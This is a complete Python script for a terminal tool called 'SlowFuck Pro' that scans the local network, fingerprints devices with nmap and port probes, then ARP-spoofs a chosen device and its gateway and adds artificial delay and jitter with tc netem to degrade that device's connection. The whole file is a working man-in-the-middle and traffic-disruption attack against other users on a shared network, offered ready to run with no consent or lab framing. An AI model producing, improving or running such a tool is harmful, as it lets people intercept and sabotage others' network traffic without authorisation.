#!/usr/bin/env python3
"""
SlowFuck Pro - Network Operations Tool
Zeta Network Control Interface
"""

import subprocess
import re
import sys
import os
import time
import signal
import curses
from threading import Thread, Lock
from dataclasses import dataclass
from typing import List, Optional

# ===== CONFIG =====
INTERFACE = "wlan0"

# ===== DATA CLASSES =====
@dataclass
class Device:
    ip: str
    mac: str
    vendor: str
    label: str = ""
    is_gateway: bool = False
    open_ports: List[int] = None
    os_guess: str = ""
    hostname: str = ""
    
    def __post_init__(self):
        if self.open_ports is None:
            self.open_ports = []

# ===== NETWORK SCANNER =====
def get_interface():
    result = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "inet " in line and "lo" not in line:
            iface = line.split(':')[1].strip().split()[0]
            return iface
    return "wlan0"

def get_gateway():
    result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
    match = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", result.stdout)
    if match:
        return match.group(1)
    return "192.168.1.1"

def get_my_ip():
    iface = get_interface()
    result = subprocess.run(["ip", "-4", "addr", "show", iface], capture_output=True, text=True)
    match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", result.stdout)
    if match:
        return match.group(1)
    return "unknown"

def arp_scan():
    devices = []
    try:
        result = subprocess.run(["sudo", "arp-scan", "--local"], capture_output=True, text=True, timeout=30)
        for line in result.stdout.split('\n'):
            parts = line.strip().split('\t')
            if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
                ip = parts[0]
                mac = parts[1]
                vendor = parts[2]
                devices.append(Device(ip=ip, mac=mac, vendor=vendor))
    except Exception:
        pass
    return devices

def label_devices(devices, gateway_ip, my_ip):
    labels = {
        "xiaomi": "Xiaomi IoT",
        "apple": "Apple Device",
        "samsung": "Samsung",
        "intel": "Intel PC",
        "frontiir": "Router",
        "bilian": "Bilian IoT",
        "raspberry": "Raspberry Pi",
        "nvidia": "NVIDIA SHIELD",
        "android": "Android Device",
        "google": "Google Device",
        "sony": "Sony",
        "lg": "LG",
        "philips": "Philips",
        "tp-link": "TP-Link",
        "netgear": "Netgear",
    }
    
    for d in devices:
        vendor_lower = d.vendor.lower()
        d.is_gateway = (d.ip == gateway_ip)
        
        if d.ip == my_ip:
            d.label = "YOU (This Machine)"
        elif d.is_gateway:
            d.label = "Gateway"
        elif "unknown" in vendor_lower:
            d.label = "Unknown"
        else:
            for key, label in labels.items():
                if key in vendor_lower:
                    d.label = label
                    break
            else:
                d.label = d.vendor[:25]
    
    return devices

def port_scan(target_ip):
    """Scan common ports on target"""
    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 993, 995, 
                    3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000]
    open_ports = []
    
    for port in common_ports:
        result = subprocess.run(
            ["nc", "-zv", "-w", "1", target_ip, str(port)],
            capture_output=True, text=True, timeout=2
        )
        if result.returncode == 0 or "succeeded" in result.stderr:
            open_ports.append(port)
    
    return open_ports

def os_detect(target_ip):
    """Attempt OS detection using nmap"""
    try:
        result = subprocess.run(
            ["nmap", "-O", "--osscan-guess", target_ip],
            capture_output=True, text=True, timeout=30
        )
        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if "OS details:" in line:
                return line.replace("OS details:", "").strip()[:30]
            elif "Running:" in line:
                return line.replace("Running:", "").strip()[:30]
        return "Unknown"
    except:
        return "Unknown"

# ===== LAG ENGINE =====
class LagEngine:
    def __init__(self, interface):
        self.interface = interface
        self.target = None
        self.gateway = None
        self.is_running = False
        self.spoof_pids = []
        self.delay_ms = 2000
        self.jitter_ms = 500
        self.log_callback = None
    
    def set_log_callback(self, callback):
        self.log_callback = callback
    
    def log(self, msg):
        if self.log_callback:
            self.log_callback(msg)
    
    def start_lag(self, target_ip, gateway_ip, delay_ms=2000, jitter_ms=500):
        self.target = target_ip
        self.gateway = gateway_ip
        self.delay_ms = delay_ms
        self.jitter_ms = jitter_ms
        self.is_running = True
        
        self.log(f"[*] Enabling IP forwarding")
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], 
                      capture_output=True)
        
        self.log(f"[*] Starting ARP spoof on {target_ip}")
        cmd1 = ["sudo", "arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip]
        cmd2 = ["sudo", "arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip]
        
        p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.spoof_pids = [p1.pid, p2.pid]
        
        time.sleep(1)
        self.log(f"[*] ARP spoofing active (PIDs: {p1.pid}, {p2.pid})")
        
        self.log(f"[*] Applying delay: {delay_ms}ms + {jitter_ms}ms jitter")
        cmd = ["sudo", "tc", "qdisc", "add", "dev", self.interface, "root", 
               "netem", "delay", f"{delay_ms}ms", f"{jitter_ms}ms"]
        subprocess.run(cmd, capture_output=True)
        
        self.log(f"[+] LAG ACTIVE: {target_ip} now slowed by {delay_ms}ms")
        return True
    
    def stop_lag(self):
        if not self.is_running:
            return False
        
        self.log("[*] Removing delay")
        subprocess.run(["sudo", "tc", "qdisc", "del", "dev", self.interface, "root"],
                      capture_output=True)
        
        self.log("[*] Killing ARP spoof processes")
        for pid in self.spoof_pids:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
        
        self.log("[*] Disabling IP forwarding")
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                      capture_output=True)
        
        self.spoof_pids = []
        self.is_running = False
        self.log("[+] LAG STOPPED: Target restored")
        return True
    
    def get_ping(self, target):
        try:
            result = subprocess.run(["ping", "-c", "1", "-W", "1", target],
                                   capture_output=True, text=True, timeout=2)
            match = re.search(r"time=(\d+\.?\d*) ms", result.stdout)
            if match:
                return float(match.group(1))
            return None
        except:
            return None

# ===== TUI =====
def tui_loop(stdscr):
    # Curses setup
    curses.curs_set(0)
    curses.use_default_colors()
    curses.start_color()
    
    # Color pairs
    curses.init_pair(1, curses.COLOR_GREEN, -1)      # Good
    curses.init_pair(2, curses.COLOR_YELLOW, -1)     # Warning
    curses.init_pair(3, curses.COLOR_RED, -1)        # Bad/Lag
    curses.init_pair(4, curses.COLOR_CYAN, -1)       # Info
    curses.init_pair(5, curses.COLOR_MAGENTA, -1)    # Highlight
    curses.init_pair(6, curses.COLOR_BLUE, -1)       # Title
    curses.init_pair(7, curses.COLOR_WHITE, curses.COLOR_BLUE)  # Selected
    
    # State
    devices = []
    selected_idx = 0
    scroll_offset = 0
    lag_engine = LagEngine(INTERFACE)
    is_lagging = False
    ping_results = {}
    exit_flag = False
    log_messages = []
    log_lock = Lock()
    current_delay = 2000
    current_jitter = 500
    show_device_info = False
    selected_device_info = None
    scanning_device = False
    
    def log(msg):
        with log_lock:
            log_messages.append(msg)
            if len(log_messages) > 50:
                log_messages.pop(0)
    
    lag_engine.set_log_callback(log)
    
    def refresh_devices():
        nonlocal devices
        try:
            raw = arp_scan()
            gateway = get_gateway()
            my_ip = get_my_ip()
            devices = label_devices(raw, gateway, my_ip)
        except Exception as e:
            log(f"[!] Scan error: {e}")
    
    def scan_device(target_ip):
        nonlocal scanning_device, selected_device_info
        scanning_device = True
        log(f"[*] Scanning {target_ip} for open ports...")
        
        ports = port_scan(target_ip)
        os_guess = os_detect(target_ip)
        
        # Update device info
        for d in devices:
            if d.ip == target_ip:
                d.open_ports = ports
                d.os_guess = os_guess
                selected_device_info = d
                break
        
        port_str = ", ".join(str(p) for p in ports) if ports else "None found"
        log(f"[+] Scan complete: {len(ports)} open ports | OS: {os_guess}")
        log(f"[+] Open ports: {port_str}")
        scanning_device = False
    
    def ping_loop():
        while not exit_flag:
            if devices:
                for d in devices[:5]:
                    if d.ip:
                        ping = lag_engine.get_ping(d.ip)
                        if ping is not None:
                            ping_results[d.ip] = ping
                if is_lagging and lag_engine.target:
                    ping = lag_engine.get_ping(lag_engine.target)
                    if ping is not None:
                        ping_results[lag_engine.target] = ping
            time.sleep(1)
    
    # Initial scan
    refresh_devices()
    
    # Start threads
    ping_thread = Thread(target=ping_loop, daemon=True)
    ping_thread.start()
    
    # Log initial
    log("[+] SlowFuck Pro initialized")
    log(f"[+] Interface: {INTERFACE}")
    log(f"[+] Gateway: {get_gateway()}")
    log(f"[+] My IP: {get_my_ip()}")
    log("[+] Press 'h' for help")
    
    # Main loop
    while not exit_flag:
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        
        # ===== TOP BAR =====
        title = " SLOWFUCK PRO - Network Operations "
        stdscr.attron(curses.color_pair(6) | curses.A_BOLD)
        stdscr.addstr(0, 0, "=" * w)
        stdscr.addstr(0, (w - len(title)) // 2, title)
        stdscr.attroff(curses.color_pair(6) | curses.A_BOLD)
        
        # ===== STATUS LINE =====
        status_line = f" IF:{INTERFACE} | IP:{get_my_ip()} | GW:{get_gateway()} "
        stdscr.addstr(1, 0, status_line, curses.color_pair(4))
        
        lag_status = f" [LAG: {current_delay}ms] " if is_lagging else " [IDLE] "
        color = curses.color_pair(3) if is_lagging else curses.color_pair(2)
        stdscr.addstr(1, w - len(lag_status) - 2, lag_status, color | curses.A_BOLD)
        
        if is_lagging:
            target_info = f" TARGET: {lag_engine.target} "
            stdscr.addstr(1, w - len(lag_status) - len(target_info) - 4, target_info, curses.color_pair(3))
        
        # ===== DEVICE LIST PANEL =====
        list_height = h - 10
        list_width = w // 2 - 2
        
        # Header
        stdscr.addstr(3, 2, " DEVICES ", curses.color_pair(6) | curses.A_BOLD)
        sep = "-" * (list_width - 2)
        stdscr.addstr(4, 2, sep)
        stdscr.addstr(4, 2, " IP", curses.A_BOLD)
        stdscr.addstr(4, 18, "Label", curses.A_BOLD)
        stdscr.addstr(4, 38, "Ping", curses.A_BOLD)
        stdscr.addstr(4, 48, "Status", curses.A_BOLD)
        stdscr.addstr(5, 2, sep)
        
        max_y = list_height - 4
        total = len(devices)
        
        if total == 0:
            stdscr.addstr(7, 2, "[ Scanning network... ]", curses.color_pair(2))
        else:
            for i in range(max_y):
                idx = i + scroll_offset
                if idx >= total:
                    break
                
                d = devices[idx]
                y = 6 + i
                
                # Selection indicator
                if idx == selected_idx:
                    stdscr.addstr(y, 2, ">", curses.color_pair(5))
                    attr = curses.A_REVERSE
                else:
                    stdscr.addstr(y, 2, " ")
                    attr = 0
                
                # IP
                ip_str = d.ip.ljust(15)
                if d.is_gateway:
                    stdscr.addstr(y, 4, ip_str, curses.color_pair(3) | attr)
                elif d.ip == get_my_ip():
                    stdscr.addstr(y, 4, ip_str, curses.color_pair(5) | attr)
                else:
                    stdscr.addstr(y, 4, ip_str, attr)
                
                # Label
                label = d.label[:20].ljust(20)
                if d.is_gateway:
                    stdscr.addstr(y, 20, label, curses.color_pair(3) | attr)
                else:
                    stdscr.addstr(y, 20, label, attr)
                
                # Ping
                ping = ping_results.get(d.ip, "---")
                if isinstance(ping, float):
                    if ping < 50:
                        pcolor = curses.color_pair(1)
                    elif ping < 200:
                        pcolor = curses.color_pair(2)
                    else:
                        pcolor = curses.color_pair(3)
                    ping_str = f"{ping:.1f}ms".ljust(8)
                    stdscr.addstr(y, 40, ping_str, pcolor | attr)
                else:
                    stdscr.addstr(y, 40, ping.ljust(8), attr)
                
                # Status
                if is_lagging and d.ip == lag_engine.target:
                    stdscr.addstr(y, 50, "SLOW", curses.color_pair(3) | curses.A_BOLD | attr)
                elif d.open_ports:
                    stdscr.addstr(y, 50, f"P{len(d.open_ports)}", curses.color_pair(4) | attr)
                elif d.os_guess:
                    stdscr.addstr(y, 50, "OS", curses.color_pair(2) | attr)
        
        # ===== DEVICE INFO PANEL =====
        info_x = list_width + 4
        info_width = w - list_width - 6
        
        if info_width > 20:
            stdscr.addstr(3, info_x, " DEVICE INFO ", curses.color_pair(6) | curses.A_BOLD)
            sep2 = "-" * (info_width - 2)
            stdscr.addstr(4, info_x, sep2)
            
            if selected_idx < len(devices) and devices:
                d = devices[selected_idx]
                y = 6
                
                stdscr.addstr(y, info_x, f"IP: {d.ip}", curses.color_pair(4))
                y += 1
                stdscr.addstr(y, info_x, f"MAC: {d.mac}")
                y += 1
                stdscr.addstr(y, info_x, f"Vendor: {d.vendor[:30]}")
                y += 1
                stdscr.addstr(y, info_x, f"Label: {d.label}")
                y += 1
                stdscr.addstr(y, info_x, f"Gateway: {d.is_gateway}")
                y += 1
                
                if d.open_ports:
                    port_str = ", ".join(str(p) for p in d.open_ports[:10])
                    if len(d.open_ports) > 10:
                        port_str += "..."
                    stdscr.addstr(y, info_x, f"Ports: {port_str}", curses.color_pair(1))
                    y += 1
                else:
                    stdscr.addstr(y, info_x, f"Ports: Not scanned", curses.color_pair(2))
                    y += 1
                
                if d.os_guess:
                    stdscr.addstr(y, info_x, f"OS: {d.os_guess}", curses.color_pair(4))
                    y += 1
                
                if scanning_device and d.ip == lag_engine.target:
                    stdscr.addstr(y, info_x, "[ Scanning... ]", curses.color_pair(2))
            else:
                stdscr.addstr(6, info_x, "No device selected")
            
            # ===== LAG CONTROLS =====
            y = h - 6
            stdscr.addstr(y, info_x, " LAG CONTROLS ", curses.color_pair(6) | curses.A_BOLD)
            y += 1
            stdscr.addstr(y, info_x, f"Delay: {current_delay}ms  [1-5]")
            y += 1
            stdscr.addstr(y, info_x, f"Jitter: {current_jitter}ms  [6-0]")
            y += 1
            stdscr.addstr(y, info_x, "ENTER: Apply  |  SPACE: Stop  |  s: Scan")
        
        # ===== LOG PANEL =====
        log_y = h - 8
        log_width = w - 4
        
        stdscr.addstr(log_y, 2, " LOG ", curses.color_pair(6) | curses.A_BOLD)
        log_y += 1
        sep3 = "-" * (log_width - 2)
        stdscr.addstr(log_y, 2, sep3)
        log_y += 1
        
        max_logs = 5
        with log_lock:
            logs = log_messages[-max_logs:] if log_messages else ["[ System ready ]"]
        
        for i, msg in enumerate(logs):
            if log_y + i < h - 2:
                # Color based on message content
                if "[+]" in msg:
                    color = curses.color_pair(1)
                elif "[!]" in msg or "Error" in msg:
                    color = curses.color_pair(3)
                elif "[*]" in msg:
                    color = curses.color_pair(4)
                else:
                    color = 0
                stdscr.addstr(log_y + i, 4, msg[:log_width-6].ljust(log_width-6), color)
        
        # ===== HELP BAR =====
        help_y = h - 1
        help_text = " ↑↓:Navigate  ENTER:ApplyLag  SPACE:Stop  s:Scan  r:Refresh  h:Help  q:Quit "
        stdscr.addstr(help_y, (w - len(help_text)) // 2, help_text, curses.color_pair(4))
        
        stdscr.refresh()
        
        # ===== INPUT HANDLING =====
        try:
            key = stdscr.getch()
        except:
            key = -1
        
        if key == ord('q') or key == ord('Q'):
            exit_flag = True
            if is_lagging:
                lag_engine.stop_lag()
            break
        
        elif key == ord('h') or key == ord('H'):
            log("[*] Help: UP/DOWN select, ENTER to lag, SPACE to stop, s to scan")
        
        elif key == ord('r') or key == ord('R'):
            log("[*] Refreshing network scan...")
            refresh_devices()
            log(f"[+] Found {len(devices)} devices")
        
        elif key == curses.KEY_UP:
            if selected_idx > 0:
                selected_idx -= 1
                if selected_idx < scroll_offset:
                    scroll_offset = selected_idx
                # Auto-scan selected device
                if devices and selected_idx < len(devices):
                    d = devices[selected_idx]
                    if not d.open_ports and not scanning_device:
                        log(f"[*] Auto-scanning {d.ip}...")
                        Thread(target=scan_device, args=(d.ip,), daemon=True).start()
        
        elif key == curses.KEY_DOWN:
            if selected_idx < len(devices) - 1:
                selected_idx += 1
                if selected_idx >= scroll_offset + 15:
                    scroll_offset = selected_idx - 14
                if devices and selected_idx < len(devices):
                    d = devices[selected_idx]
                    if not d.open_ports and not scanning_device:
                        log(f"[*] Auto-scanning {d.ip}...")
                        Thread(target=scan_device, args=(d.ip,), daemon=True).start()
        
        elif key == ord('s') or key == ord('S'):
            if devices and selected_idx < len(devices):
                d = devices[selected_idx]
                if not scanning_device:
                    Thread(target=scan_device, args=(d.ip,), daemon=True).start()
        
        # Delay presets
        elif key == ord('1'):
            current_delay = 500
            log(f"[*] Delay set to 500ms")
        elif key == ord('2'):
            current_delay = 1000
            log(f"[*] Delay set to 1000ms")
        elif key == ord('3'):
            current_delay = 2000
            log(f"[*] Delay set to 2000ms")
        elif key == ord('4'):
            current_delay = 3000
            log(f"[*] Delay set to 3000ms")
        elif key == ord('5'):
            current_delay = 5000
            log(f"[*] Delay set to 5000ms (brutal)")
        
        # Jitter presets
        elif key == ord('6'):
            current_jitter = 100
            log(f"[*] Jitter set to 100ms")
        elif key == ord('7'):
            current_jitter = 300
            log(f"[*] Jitter set to 300ms")
        elif key == ord('8'):
            current_jitter = 500
            log(f"[*] Jitter set to 500ms")
        elif key == ord('9'):
            current_jitter = 800
            log(f"[*] Jitter set to 800ms")
        elif key == ord('0'):
            current_jitter = 1000
            log(f"[*] Jitter set to 1000ms (chaotic)")
        
        elif key == ord(' '):
            if is_lagging:
                lag_engine.stop_lag()
                is_lagging = False
                log("[+] Lag stopped")
        
        elif key == 10 or key == ord('\n'):
            if devices and selected_idx < len(devices):
                target = devices[selected_idx]
                gateway = get_gateway()
                
                if target.ip == get_my_ip():
                    log("[!] Cannot lag yourself")
                    continue
                
                if target.is_gateway:
                    log("[!] Cannot lag gateway")
                    continue
                
                if is_lagging:
                    lag_engine.stop_lag()
                    is_lagging = False
                
                log(f"[*] Starting lag on {target.ip} ({target.label})")
                lag_engine.start_lag(target.ip, gateway, current_delay, current_jitter)
                is_lagging = True

# ===== MAIN =====
def main():
    if os.geteuid() != 0:
        print("ERROR: This tool requires sudo privileges.")
        print("Run: sudo python3 slowfuck.py")
        sys.exit(1)
    
    global INTERFACE
    INTERFACE = get_interface()
    print(f"Initializing on interface: {INTERFACE}")
    
    try:
        curses.wrapper(tui_loop)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error: {e}")
    
    lag_engine = LagEngine(INTERFACE)
    lag_engine.stop_lag()
    print("\n[+] Shutdown complete")

if __name__ == "__main__":
    main()